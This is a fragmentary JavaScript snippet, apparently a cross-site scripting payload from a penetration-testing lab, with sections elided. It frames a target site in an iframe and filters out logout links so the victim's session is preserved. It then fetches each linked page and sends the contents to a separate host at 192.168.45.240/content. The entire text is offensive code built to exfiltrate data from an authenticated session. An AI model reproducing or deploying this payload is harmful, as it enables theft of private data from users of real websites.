...
iframe.width = "100%"
iframe.height = "100%"
iframe.src = "https://192.168.165.129"
...
function validURL(url) {
    var lowerCaseInput = url.toLowerCase();
    if (lowerCaseInput.includes('logout') || lowerCaseInput.includes('logoff')) {
        return false;
    } else {
        return true;
    }
...
function getContent(){
	...
	validUniqueHrefs.forEach(href =>{
	    ...
	    .then(function (text){
	      fetch("https://192.168.45.240/content", {
